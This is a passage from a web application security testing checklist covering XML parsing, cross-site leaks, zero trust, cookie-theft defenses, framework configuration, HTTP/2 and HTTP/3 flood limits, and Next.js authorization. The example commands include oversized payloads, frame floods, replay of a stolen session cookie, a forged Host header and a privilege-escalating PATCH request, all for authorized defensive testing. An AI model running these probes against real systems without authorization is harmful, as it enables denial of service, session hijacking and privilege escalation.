  *Example:* `python3 -c "print('<age>'+'9'*100000+'</age>')" > big.xml; curl -s -o /dev/null -w '%{time_total}\n' -H 'Content-Type: application/xml' --data-binary @big.xml https://target/api; compare the response time with a normal document`  
  *Expected:* The schema sets type, length and range limits for each element. The server rejects an oversized document before it parses it fully.  
  *Refs:* owasp_top10: A05:2025, A06:2025; cheatsheet: XML_Security_Cheat_Sheet; wstg: WSTG-INJT-07; cwe: CWE-20, CWE-400; other: OWASP DevGuide web app checklist: 05-validate-inputs.md

- [ ] **WEB-XMLSEC-003** Test XML parser handling of malformed documents and recovery mode  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find XML parsers that repair or normalize invalid documents, so that two components read the same data in different ways.  
  *Steps:*
  1. Find out which XML parser and which options the application uses.
  2. Send a document with a double hyphen in a comment and with a nested comment.
  3. Send a document with an unclosed tag and look at the response.
  4. Make sure the parser is not in recovery mode and rejects the document.
  5. Compare the response time of a valid document and a malformed version of it.
  *Example:* `curl -d '<a><!-- one <!-- two --></a>' -H "Content-Type: application/xml" https://target/xml; compare timing with curl -w "%{time_total}"`  
  *Expected:* The server rejects malformed documents and does not repair them. A malformed document does not take more time than a valid one.  
  *Refs:* owasp_top10: A05:2025; cheatsheet: XML_Security_Cheat_Sheet; wstg: WSTG-INJT-07; asvs: V1.5.3; cwe: CWE-20


## XSLEAK

- [ ] **WEB-XSLEAK-001** Test authenticated endpoints for cross-site leaks of user state  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Find endpoints whose behavior shows account state to an attacker page through error events, frame counts, focus or cache timing.  
  *Steps:*
  1. Pick endpoints that answer differently for logged-in users, admins or owners, such as status code, redirect or size.
  2. Load each endpoint from a page on another origin as image, script, iframe or window.open, in a test environment.
  3. Look for differences you can see: onload and onerror events, frame count, and load time.
  4. Check that the endpoints send Cross-Origin-Resource-Policy, Cross-Origin-Opener-Policy and framing headers.
  5. Make sure the server uses Sec-Fetch-Site or Sec-Fetch-Dest to reject cross-site requests to private resources.
  6. Check that resources with user data use Cache-Control: no-store or an unpredictable URL.
  *Example:* `Attacker page: <img src="https://target/api/user/1234" onload=... onerror=...>; curl -sI https://target/api/me -H "Sec-Fetch-Site: cross-site"`  
  *Expected:* A cross-site page cannot tell the user state from the result of a request. Private resources need isolation headers and reject cross-site requests.  
  *Refs:* owasp_top10: A01:2025; cheatsheet: XS_Leaks_Cheat_Sheet; wstg: WSTG-CLNT-09; cwe: CWE-203, CWE-200; capec: CAPEC-462


## ZTA

- [ ] **WEB-ZTA-001** Test that access is granted per session and re-evaluated during the session  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds access that carries over between resources or stays valid after policy changes.  
  *Steps:*
  1. Log in and get access to resource A. Try to open resource B with the same session.
  2. Make sure resource B needs its own authorization decision with least privileges.
  3. Change a risk factor during an active session, such as device state or location.
  4. Make sure the system asks for reauthentication or ends the session when policy requires it.
  *Example:* `Two resources with different roles; change device posture or source IP in a test session`  
  *Expected:* Each resource session gets its own authorization. A change in policy inputs triggers reauthentication or session end.  
  *Refs:* cheatsheet: Zero_Trust_Architecture_Cheat_Sheet; cwe: CWE-863; nist_800_53: AC-3, AC-12

- [ ] **WEB-ZTA-002** Test that the access policy uses risk signals beyond valid credentials  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds policies that grant access to anyone with a valid password or token.  
  *Steps:*
  1. Log in with valid credentials from an unmanaged device.
  2. Log in with valid credentials from an unusual location and time.
  3. Access a sensitive resource with a normal risk level, then with a high risk level.
  4. Make sure the policy denies, limits or asks for stronger authentication as the risk rises.
  5. Make sure the decision is logged with the signals used.
  *Example:* `Conditional access test accounts; VPN or proxy for location change; second test device`  
  *Expected:* High-risk access is denied or needs stronger authentication even with valid credentials. Each decision is logged.  
  *Refs:* cheatsheet: Zero_Trust_Architecture_Cheat_Sheet; cwe: CWE-287; nist_800_53: AC-2, IA-2

- [ ] **WEB-ZTA-003** Test device trust, health checks and revocation of access  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds unmanaged or compromised devices that keep access to resources.  
  *Steps:*
  1. Make sure all approved devices are registered with a certificate-based identity.
  2. Connect from a device that is not registered. Make sure access is blocked or limited to an isolated session.
  3. Make a test device fail a health check, such as an old OS patch level.
  4. Make sure access is limited or removed automatically.
  5. Mark a test device as compromised. Make sure its access ends at once.
  *Example:* `MDM or EDR console; client certificate on a test device; test health policy`  
  *Expected:* Only registered healthy devices get full access. Failed or compromised devices lose access automatically.  
  *Refs:* cheatsheet: Zero_Trust_Architecture_Cheat_Sheet; cwe: CWE-287; nist_800_53: CM-8, AC-17

- [ ] **WEB-ZTA-004** Check just-in-time administrator access and separate administrator accounts  
  *Severity if fail:* High | *Type:* Config Review, Manual  
  *Objective:* Finds permanent administrator rights that give an attacker standing access.  
  *Steps:*
  1. List accounts with administrator rights.
  2. Make sure administrators use separate accounts for administration.
  3. Make sure no account has always-on administrator rights.
  4. Request elevated access on a test system. Make sure it is approved, time-limited and logged.
  5. Make sure access ends automatically at expiry.
  *Example:* `PAM tool export; role assignment list; test elevation request`  
  *Expected:* No standing administrator rights exist. Elevated access is approved, expires on its own and is logged.  
  *Refs:* cheatsheet: Zero_Trust_Architecture_Cheat_Sheet; cwe: CWE-250, CWE-269; nist_800_53: AC-6, AC-2

- [ ] **WEB-ZTA-005** Test that an enforcement point cannot be bypassed to reach the resource  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds resources that accept direct requests that skip the identity-aware proxy or gateway.  
  *Steps:*
  1. Find the identity-aware proxy, API gateway or ZTNA broker that protects the application.
  2. Find the backend address of the application.
  3. Send a request to the backend directly from a network the proxy does not control.
  4. Send an API call with no identity through the gateway.
  5. Make sure both requests are rejected.
  *Example:* `curl -i https://BACKEND_HOST/ ; curl -i https://GATEWAY/api/resource`  
  *Expected:* The backend accepts requests only from the enforcement point. Requests without valid identity are rejected.  
  *Refs:* cheatsheet: Zero_Trust_Architecture_Cheat_Sheet; cwe: CWE-306, CWE-419; nist_800_53: AC-3, SC-7

- [ ] **WEB-ZTA-006** Test automated response when an account or device shows signs of compromise  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds environments that detect compromise but cannot isolate accounts or devices quickly.  
  *Steps:*
  1. Review the monitoring that feeds the policy engine, such as SIEM, behavior analysis and device health.
  2. Trigger a harmless test alert for a test account, such as logins from two distant locations.
  3. Make sure the account is isolated or must reauthenticate within the target time.
  4. Make sure the team tracks detection and response times and policy violations.
  *Example:* `SIEM test rule; incident record with MTTD and MTTR`  
  *Expected:* A test alert isolates the account or device within the target time. The team tracks detection and response metrics.  
  *Refs:* cheatsheet: Zero_Trust_Architecture_Cheat_Sheet; cwe: CWE-778; nist_800_53: SI-4, IR-4


## DBSC

- [ ] **WEB-DBSC-001** Replay a session cookie from another device and network  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find sessions that stay valid when a stolen cookie is used from a different device, network or region.  
  *Steps:*
  1. Log in with browser A. Copy the session cookie value.
  2. Send a request with the cookie from a client with a different IP address, region and User-Agent.
  3. Repeat with a changed Accept-Language header and with removed Client Hint headers.
  4. Send the request to a read endpoint. Send it also to a sensitive endpoint, such as a delete action.
  5. Look for a block, a step-up challenge or an alert. Look in the security log for an event.
  6. Make sure the original session is still usable only after the legitimate user passes re-authentication.
  *Example:* `curl -s https://target/account -H "Cookie: session=<value>" -H "User-Agent: Mozilla/5.0 (X11; Linux) Firefox/130" -H "Accept-Language: ja" --proxy socks5h://other-region-proxy:1080`  
  *Expected:* A large change of the session environment on a sensitive request gives a block or a re-authentication step. The server saves the first IP, User-Agent and Accept-Language and logs the event.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-09; cheatsheet: Cookie_Theft_Mitigation_Cheat_Sheet; cwe: CWE-294, CWE-1462; capec: CAPEC-60, CAPEC-593  
  *See:* WEB-SESS-018

- [ ] **WEB-DBSC-002** Check the response to a suspected cookie theft  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find a detection flow that leaves the stolen session active, accepts a CAPTCHA as proof or blocks real users too often.  
  *Steps:*
  1. Trigger a detection event with a replayed cookie.
  2. Make sure the application ends or limits the suspect session on the server.
  3. Make sure the user must authenticate again with an account-bound authenticator.
  4. Make sure a solved CAPTCHA alone does not restore access.
  5. Make sure a new session cookie is issued after re-authentication and the old cookie fails.
  6. Review the rules for false positives, such as a changed Wi-Fi network or a browser update. Make sure the user is not locked out each time.
  7. Make sure the checks cover the endpoints that read or change important data.
  *Example:* `curl -i https://target/users/delete -X POST -H "Cookie: session=<stolen>"; then reuse the old cookie after re-authentication and look for 401 or 403`  
  *Expected:* The suspect session ends or is restricted on the server. Only account-bound re-authentication restores access, and the old cookie fails. Rules do not block normal changes.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-09; asvs: V7.5.3; cheatsheet: Cookie_Theft_Mitigation_Cheat_Sheet; cwe: CWE-1464, CWE-294; capec: CAPEC-593; other: NIST SP 800-63B-4: https://pages.nist.gov/800-63-4/sp800-63b.html  
  *See:* WEB-SESS-026

- [ ] **WEB-DBSC-003** Check the DBSC registration and refresh endpoints  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Find a Device Bound Session Credentials server that accepts old challenges, unsigned refreshes or keys that do not belong to the session.  
  *Steps:*
  1. Log in and look for the Secure-Session-Registration header in the login response.
  2. Capture the registration request. Make sure the server saves the public key with the new session identifier.
  3. Wait for the short-lived bound cookie to expire. Capture the refresh request and the Secure-Session-Challenge header.
  4. Send a refresh request with no Secure-Session-Response header. Make sure the server issues no new bound cookie.
  5. Send a refresh request that signs an old challenge. Make sure the server rejects the stale challenge.
  6. Send a refresh request that is signed with a different key. Make sure the server rejects it.
  7. Make sure the refresh endpoint needs the Sec-Secure-Session-Id header and has a narrow CORS policy.
  8. Make sure the refresh endpoint refuses to be embedded with X-Frame-Options or Cross-Origin-Resource-Policy.
  9. Make sure the bound cookie lifetime is short.
  *Example:* `Burp Repeater on POST /refresh: remove the Secure-Session-Response header; replay a signed response from a previous challenge; sign with a new ES256 key`  
  *Expected:* The server issues a bound cookie only for a fresh challenge signed with the registered key. A stolen cookie stops working after its short lifetime on another device.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-09; cheatsheet: Cookie_Theft_Mitigation_Cheat_Sheet; cwe: CWE-294, CWE-1472; capec: CAPEC-60; other: W3C Device Bound Session Credentials: https://w3c.github.io/webappsec-dbsc/


## FWK

- [ ] **WEB-FWK-001** Check the Django production settings for debug, hosts and cookies  
  *Severity if fail:* High | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find a Django deployment that runs with debug mode, an empty host list or insecure cookie and redirect settings.  
  *Steps:*
  1. Open the production settings module and find the DEBUG value. It must be False.
  2. Find ALLOWED_HOSTS. Make sure the list is not empty and does not hold a wildcard.
  3. Make sure SESSION_COOKIE_SECURE, CSRF_COOKIE_SECURE and SECURE_SSL_REDIRECT are True.
  4. Make sure SecurityMiddleware and XFrameOptionsMiddleware are in MIDDLEWARE, in this order.
  5. Make sure SECURE_PROXY_SSL_HEADER is set only when a trusted proxy strips and sets the header.
  6. Run the Django deploy check with the production settings and look at each warning.
  7. Send a request to a missing URL and a request with a wrong Host header. Look for debug pages.
  *Example:* `python manage.py check --deploy --settings=prod.settings; curl -sk https://target/nonexistent-url-123 | grep -i "DEBUG = True"; curl -sk -H "Host: evil.example" https://target/`  
  *Expected:* DEBUG is False and ALLOWED_HOSTS lists only real host names. The deploy check shows no security warning. Error pages show no settings or stack trace.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02, WSTG-ERRH-01; asvs: V13.4.2; cheatsheet: Django_Security_Cheat_Sheet; cwe: CWE-489, CWE-215  
  *See:* WEB-CONF-002, WEB-ERR-002

- [ ] **WEB-FWK-002** Check Django SECRET_KEY strength, storage and rotation  
  *Severity if fail:* High | *Type:* Config Review, Code Review | *Level:* ASVS L2  
  *Objective:* Find a weak, hard-coded or exposed Django SECRET_KEY that lets an attacker forge signed data.  
  *Steps:*
  1. Find the SECRET_KEY value in settings.py and in the repository history.
  2. Make sure the key has at least 50 characters and does not start with django-insecure-.
  3. Make sure the key is read from an environment variable or a secrets manager.
  4. Look for a written key rotation procedure. It must name the effect on sessions and password reset tokens.
  5. Make sure a leaked key causes an immediate rotation.
  *Example:* `git log -p -S SECRET_KEY -- "*settings*.py"; grep -rn "SECRET_KEY" --include=*.py .; python manage.py check --deploy | grep W009`  
  *Expected:* The key is long, random and loaded from a secret store. No repository file or history holds it, and a rotation procedure exists.  
  *Refs:* owasp_top10: A02:2025; asvs: V13.3.1; cheatsheet: Django_Security_Cheat_Sheet; cwe: CWE-798

- [ ] **WEB-FWK-003** Check Django REST Framework default permission, throttle and paging classes  
  *Severity if fail:* High | *Type:* Config Review, Code Review | *Level:* ASVS L2  
  *Objective:* Find a REST API that is open to everyone because the framework defaults were not changed.  
  *Steps:*
  1. Open the REST_FRAMEWORK setting. Find DEFAULT_PERMISSION_CLASSES.
  2. Make sure the value is not rest_framework.permissions.AllowAny.
  3. Search the views for permission_classes and authentication_classes overrides. Examine each override.
  4. Make sure each AllowAny view is a public endpoint on purpose.
  5. Make sure DEFAULT_THROTTLE_CLASSES and DEFAULT_THROTTLE_RATES are set, and DEFAULT_PAGINATION_CLASS is set.
  6. Send a request without credentials to a list endpoint. Look for data in the response.
  7. Make sure DEBUG and DEBUG_PROPAGATE_EXCEPTIONS are False.
  *Example:* `grep -rn "permission_classes\|authentication_classes\|AllowAny" --include=*.py .; curl -s https://target/api/items/`  
  *Expected:* The default permission class denies anonymous users, throttle and paging classes are set, and every override is documented and has a reason.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02; cheatsheet: Django_REST_Framework_Cheat_Sheet; cwe: CWE-1188, CWE-285  
  *See:* API-RES-001

- [ ] **WEB-FWK-004** Review framework field allow-lists and server-side validation constraints  
  *Severity if fail:* High | *Type:* Code Review, Manual | *Level:* ASVS L2  
  *Objective:* Find framework models, serializers and validators that accept or return fields the client must not set or see.  
  *Steps:*
  1. Django REST Framework - find each ModelSerializer. Make sure Meta.fields is an explicit list and does not use exclude or __all__.
  2. Laravel - make sure no model sets $guarded to an empty array. Make sure forceFill and forceCreate get no raw request data.
  3. FastAPI - make sure separate input schemas exclude server-set fields and a response_model is set on each route.
  4. FastAPI - make sure extra="forbid" is set where the API must reject unknown fields.
  5. Java - make sure controller parameters use @Valid and the constraints cover size, pattern and range.
  6. Send a request with an extra field such as is_admin. Examine the stored object and the response.
  *Example:* `grep -rn "fields = \"__all__\"\|exclude =\|\$guarded = \[\]\|forceFill\|forceCreate" .; curl -X PATCH https://target/api/me -d "{\"is_admin\":true}"`  
  *Expected:* Only listed fields are bound and returned, unknown fields are rejected or ignored, and input that breaks a constraint gets a client error.  
  *Refs:* owasp_top10: A06:2025; wstg: WSTG-INJT-20; asvs: V15.3.3; cheatsheet: Django_REST_Framework_Cheat_Sheet, Laravel_Cheat_Sheet, FastAPI_Security_Cheat_Sheet, Bean_Validation_Cheat_Sheet; cwe: CWE-915  
  *See:* WEB-ARCH-006, WEB-INJ-022, WEB-AUTHZ-007

- [ ] **WEB-FWK-005** Check the FastAPI documentation routes and ASGI proxy trust in production  
  *Severity if fail:* Medium | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find a FastAPI deployment that exposes its schema or trusts forwarding headers from any client.  
  *Steps:*
  1. Request /docs, /redoc and /openapi.json on the production host without credentials.
  2. If the documentation is private, make sure openapi_url is None or the routes need authentication.
  3. Look at the Uvicorn start command. Find the --forwarded-allow-ips value.
  4. Make sure the value lists only the addresses of trusted reverse proxies and is not a wildcard.
  5. Send a request with a forged X-Forwarded-For and X-Forwarded-Proto header directly to the application port.
  6. Make sure the application does not take the client address or scheme from the forged header.
  7. Make sure the Server header is off.
  *Example:* `curl -sk -o /dev/null -w "%{http_code}\n" https://target/docs https://target/openapi.json; uvicorn app:app --forwarded-allow-ips=10.0.0.5 --no-server-header`  
  *Expected:* Documentation routes are closed or protected. Proxy trust is limited to known proxy addresses. Forged forwarding headers do not change the client address or scheme.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02; asvs: V13.4.2, V4.1.3; cheatsheet: FastAPI_Security_Cheat_Sheet; cwe: CWE-1188

- [ ] **WEB-FWK-006** Check Laravel and Symfony production mode, application key and secrets  
  *Severity if fail:* High | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Find a Laravel or Symfony application that runs in debug mode or keeps its key and secrets in unsafe places.  
  *Steps:*
  1. Laravel - make sure APP_DEBUG is false in the production environment.
  2. Laravel - make sure APP_KEY is set, is not in the repository.
  3. Laravel - make sure the cookie encryption middleware is on and session cookies use HttpOnly, Secure and SameSite.
  4. Symfony - make sure APP_ENV is prod and the production error page is generic.
  5. Symfony - make sure API keys are in the secrets vault. Make sure the private decryption key file is not in the repository.
  6. Symfony - make sure framework.session sets cookie_secure to true and cookie_samesite to lax or strict.
  7. Make sure directories have mode 775 or less and ordinary files have mode 664 or less.
  *Example:* `grep -E "APP_DEBUG|APP_ENV|APP_KEY" .env*; php bin/console secrets:list; stat -c "%a %n" storage bootstrap/cache; git log -S APP_KEY`  
  *Expected:* Debug mode is off. The key and secrets come from a vault or the environment and are not in the repository. Cookie settings are strict and file modes are not wider than needed.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02, WSTG-CONF-09; asvs: V13.4.2, V13.3.1; cheatsheet: Laravel_Cheat_Sheet, Symfony_Cheat_Sheet; cwe: CWE-489, CWE-798  
  *See:* WEB-CONF-002

- [ ] **WEB-FWK-007** Check the php.ini settings of a production PHP server  
  *Severity if fail:* Medium | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Find php.ini values that show errors, allow remote includes or leave dangerous functions on.  
  *Steps:*
  1. Make sure the PHP branch is still in security support.
  2. Make sure expose_php is Off, display_errors is Off, html_errors is Off and log_errors is On.
  3. Make sure allow_url_fopen and allow_url_include are Off.
  4. Make sure open_basedir limits PHP to the web root and the needed paths.
  5. Make sure disable_functions lists the functions the application does not use, such as exec, system and passthru.
  6. Make sure file_uploads is Off when the application has no upload, and upload_max_filesize and post_max_size are small.
  7. Make sure enable_dl is Off and the session settings use secure cookie values.
  *Example:* `php -i | grep -E "expose_php|display_errors|allow_url|open_basedir|disable_functions|enable_dl|file_uploads"; php -v`  
  *Expected:* Errors go to the log only, remote file access is off, dangerous functions are disabled, and upload and execution limits are set.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02; asvs: V13.4.2; cheatsheet: PHP_Configuration_Cheat_Sheet; cwe: CWE-209  
  *See:* WEB-ERR-002

- [ ] **WEB-FWK-008** Check Ruby on Rails session store, routes and sensitive files  
  *Severity if fail:* Medium | *Type:* Config Review, Code Review | *Level:* ASVS L2  
  *Objective:* Find a Rails application with replayable cookie sessions, open route patterns or committed secret files.  
  *Steps:*
  1. Find the session store setting. Note if it is the default cookie store.
  2. If sessions use cookies, make sure a server-side expiry or a database session store limits replay of old cookies.
  3. Make sure the session does not hold sensitive data.
  4. Open config/routes.rb. Find routes that map any controller or action from a URL pattern.
  5. Make sure users can reach only the intended controller methods.
  6. Make sure database.yml, secret_token.rb and local databases are not in the repository.
  7. Make sure HSTS is set in the production environment file.
  *Example:* `grep -n "session_store" config/**/*.rb; grep -n ":controller\|:action" config/routes.rb; git ls-files | grep -E "database.yml|secret|sqlite3"`  
  *Expected:* Sessions can expire on the server, routes expose only chosen actions, and no secret or data file is in the repository.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02; cheatsheet: Ruby_on_Rails_Cheat_Sheet; cwe: CWE-798, CWE-1463


## H2

- [ ] **WEB-H2-001** Test HTTP/2 frame floods, header size limits and CONNECT load  
  *Severity if fail:* Medium | *Type:* Automated, Manual | *Level:* ASVS L2  
  *Objective:* Find an HTTP/2 server or proxy that a peer can overload with many small frames, large header blocks or CONNECT streams.  
  *Steps:*
  1. Read the server settings for the number of concurrent streams, the header list size and the idle timeout.
  2. Send many PING frames. Look for a connection error such as ENHANCE_YOUR_CALM, or a rate limit.
  3. Send many SETTINGS frames, empty frames and tiny WINDOW_UPDATE frames. Watch CPU and memory use.
  4. Send many invalid requests so that the server answers with many RST_STREAM frames. Look for a limit on this.
  5. Send many PRIORITY frames. Look for a limit on this.
  6. Send a header block larger than SETTINGS_MAX_HEADER_LIST_SIZE. Make sure the server answers with 431 or closes the connection.
  7. On a proxy, open many CONNECT streams. Make sure a separate limit stops them.
  *Example:* `h2load -n 100000 -c 10 -m 100 https://test-target/; nghttp -v https://test-target/; custom script that sends 100000 PING frames; curl -v --http2 -H "X-Big: $(head -c 70000 /dev/zero | tr \\0 a)" https://test-target/`  
  *Expected:* The server tracks unusual frame use and limits it, closes abusive connections, returns 431 for oversize headers, and keeps normal clients responsive.  
  *Refs:* owasp_top10: A02:2025; asvs: V15.2.2; cwe: CWE-400, CWE-770; capec: CAPEC-125; other: RFC 9113 section 10.5: https://www.rfc-editor.org/rfc/rfc9113#section-10.5  
  *See:* WEB-HTTP-005, NET-DOS-002

- [ ] **WEB-H2-002** Test HTTP/3 limits for unknown elements, field sections and push  
  *Severity if fail:* Medium | *Type:* Automated, Manual | *Level:* ASVS L2  
  *Objective:* Find an HTTP/3 server that a peer can overload with unknown frames, large field sections or too many push IDs.  
  *Steps:*
  1. Read the server settings for QUIC stream limits and SETTINGS_MAX_FIELD_SECTION_SIZE.
  2. Send many unknown frame types and unknown stream types. Look for a limit or an H3_EXCESSIVE_LOAD close.
  3. Send a SETTINGS frame with many undefined parameters. Look for a limit.
  4. Send a field section larger than the limit. Make sure the server answers with 431 or rejects the request.
  5. If the server uses server push, check the limit on the number of push IDs.
  6. On a proxy, open many CONNECT streams. Make sure a separate limit stops them.
  7. Watch CPU and memory use. Make sure normal requests stay fast.
  *Example:* `curl -v --http3 https://test-target/; h2load --npn-list h3 -n 50000 -c 10 https://test-target/; quiche or aioquic client script for unknown frame types`  
  *Expected:* The server limits unknown elements, field sections and push IDs, closes abusive connections with an error code, and keeps normal clients responsive.  
  *Refs:* owasp_top10: A02:2025; asvs: V15.2.2; cwe: CWE-400, CWE-770; capec: CAPEC-125; other: RFC 9114 section 10.5: https://www.rfc-editor.org/rfc/rfc9114#section-10.5  
  *See:* WEB-HTTP-005


## ISO

- [ ] **WEB-ISO-001** Check the server-side resource isolation policy with Fetch Metadata headers  
  *Severity if fail:* Medium | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find a server that serves private resources to any cross-site request because it has no Fetch Metadata policy.  
  *Steps:*
  1. Find the filter that reads Sec-Fetch-Site, Sec-Fetch-Mode and Sec-Fetch-Dest.
  2. Send a request to an authenticated API endpoint with Sec-Fetch-Site set to cross-site. Make sure the server rejects it.
  3. Send a request with Sec-Fetch-Site set to same-origin, same-site and none. Make sure only intended requests pass.
  4. Send a cross-site navigation GET request. Make sure the policy allows it only for pages that must be linked.
  5. Send a cross-site request with Sec-Fetch-Dest set to image, script or iframe to a private resource. Make sure it fails.
  6. Remove all Sec-Fetch headers. Make sure the fallback rule is deliberate and old browsers are handled.
  7. If the response depends on a Fetch Metadata header, make sure the Vary header lists it.
  *Example:* `curl -i https://target/api/profile -H "Cookie: session=<value>" -H "Sec-Fetch-Site: cross-site" -H "Sec-Fetch-Mode: no-cors" -H "Sec-Fetch-Dest: image"`  
  *Expected:* Cross-site requests for private resources are rejected, cross-site navigations are limited to public pages, and the behavior without the headers is documented. Caches get a Vary header.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-CLNT-09; asvs: V3.5.8; cheatsheet: XS_Leaks_Cheat_Sheet; cwe: CWE-203, CWE-200; capec: CAPEC-462; other: W3C Fetch Metadata Request Headers: https://www.w3.org/TR/fetch-metadata/  
  *See:* WEB-XSLEAK-001, WEB-CSRF-001

- [ ] **WEB-ISO-002** Check Cross-Origin-Resource-Policy on private and public resources  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find private images, scripts and documents that other sites can load and measure because the response has no Cross-Origin-Resource-Policy header.  
  *Steps:*
  1. List resources that need a login, such as images, scripts, JSON and downloads.
  2. Request each resource and look for the Cross-Origin-Resource-Policy header.
  3. Make sure private resources use same-origin, or same-site when sibling sites need them.
  4. Make sure cross-origin is used only for resources that other sites must embed.
  5. Load a private resource from a page on another origin with an img or script tag. Make sure the browser blocks it.
  *Example:* `curl -sI https://target/avatars/me.png -H "Cookie: session=<value>" | grep -i cross-origin-resource-policy; <img src="https://target/avatars/me.png"> on https://attacker.test`  
  *Expected:* Private resources send Cross-Origin-Resource-Policy with same-origin or same-site. A page on another origin cannot load them.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-CLNT-09; asvs: V3.5.8; cheatsheet: XS_Leaks_Cheat_Sheet; cwe: CWE-200; capec: CAPEC-462  
  *See:* WEB-XSLEAK-001, WEB-CLIENT-014

- [ ] **WEB-ISO-003** Check cache controls on resources that show user state  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find resources whose cache state tells another site if a user visited a page or holds a role.  
  *Steps:*
  1. List resources that only some users can load, such as admin images, scripts and styles.
  2. Load a resource as the high-role user. Look at the Cache-Control header of the response.
  3. Make sure the response uses Cache-Control with no-store. Or make sure the URL holds an unpredictable token for each user.
  4. Make sure the token is long and the server checks it.
  5. On a test page, load the resource and measure the load time. Look for a difference between a cached and a fresh load.
  *Example:* `curl -sI https://target/static/admin-panel.css -H "Cookie: session=<admin>" | grep -i cache-control; performance.getEntriesByName(url)[0].duration on the test page`  
  *Expected:* Role-specific resources use no-store or a per-user unpredictable URL. A test page cannot tell from load time if the resource was cached.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-CLNT-09; cheatsheet: XS_Leaks_Cheat_Sheet; cwe: CWE-524, CWE-203; capec: CAPEC-462  
  *See:* WEB-XSLEAK-001

- [ ] **WEB-ISO-004** Check SameSite cookies against same-site sibling origins  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find sessions that a sibling subdomain or a shared public suffix site can still reach because SameSite is not a full origin boundary.  
  *Steps:*
  1. List all sibling subdomains. Find those that host user content, third-party services or old applications.
  2. Make sure the application is not hosted on a shared suffix such as github.io, where other tenants are cross-site.
  3. Read the SameSite value of each session cookie. Make sure it is Lax or Strict.
  4. From a page on a sibling subdomain, send a state-changing request to the main application. Look for acceptance.
  5. Make sure origin checks and CSRF tokens still run for same-site requests.
  *Example:* `curl -sI https://target/login | grep -i set-cookie; fetch("https://app.example.com/api/delete",{method:"POST",credentials:"include"}) from https://blog.example.com`  
  *Expected:* Session cookies use SameSite Lax or Strict. Same-site sibling origins get no extra trust, and CSRF and origin checks stay on for them.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-CLNT-09; asvs: V3.3.2; cheatsheet: XS_Leaks_Cheat_Sheet; cwe: CWE-1275  
  *See:* WEB-SESS-009


## NODE

- [ ] **WEB-NODE-001** Call Next.js Server Actions and route handlers directly without the page  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find Server Actions, Route Handlers and Draft Mode handlers that skip authentication or object checks because only the page checks them.  
  *Steps:*
  1. List Server Actions, Route Handlers, Pages API Routes and Draft Mode handlers from the route and source tree.
  2. Mark each entry point as public or protected.
  3. Send a POST request to each protected action without a session and without loading the page first.
  4. Send the same request with a session of a user who does not own the object or tenant.
  5. Change a user or tenant identifier in the arguments. Make sure the server does not accept it as proof of permission.
  6. Send a request with a foreign Origin header to a Server Action. Make sure the request fails.
  7. Call each Draft Mode handler without credentials. Make sure no __prerender_bypass cookie is set.
  *Example:* `curl -i -X POST https://target/dashboard -H "Next-Action: <action-id>" -H "Content-Type: text/plain;charset=UTF-8" -d "[\"other-user-id\"]"; curl -i https://target/api/draft`  
  *Expected:* Each protected entry point denies unauthenticated, wrong-owner and wrong-tenant requests by itself. Foreign origins fail, and Draft Mode needs authentication.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-02; asvs: V8.2.1, V8.2.2; cheatsheet: Nextjs_Security_Cheat_Sheet; cwe: CWE-862, CWE-639; capec: CAPEC-1; other: Next.js authentication guide: https://nextjs.org/docs/app/guides/authentication  
  *See:* WEB-AUTHZ-009

- [ ] **WEB-NODE-002** Check that authorization does not rely on Next.js Proxy or middleware alone  
  *Severity if fail:* Critical | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find protected routes that become open when the Proxy matcher misses a route or the middleware is bypassed.  
  *Steps:*
  1. Read the Proxy or middleware matcher. List the protected route families it does not match.
  2. Request each unmatched protected route without a session. Make sure the handler or data layer denies it.
  3. Look at the data access code. Make sure it checks authorization before it reads protected data.
  4. Make sure the Next.js version is a patched release for CVE-2025-29927.
  *Example:* `curl -i https://target/admin/users; grep -n "matcher" proxy.ts middleware.ts`  
  *Expected:* Every protected path is denied when the Proxy or middleware is skipped. The Proxy only redirects early, and the framework version is patched.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-02; asvs: V8.2.1; cheatsheet: Nextjs_Security_Cheat_Sheet; cwe: CWE-862; capec: CAPEC-1; other: CVE-2025-29927 advisory: https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw  
  *See:* WEB-AUTHZ-009

- [ ] **WEB-NODE-003** Look for server-only data sent to the browser in Next.js responses  
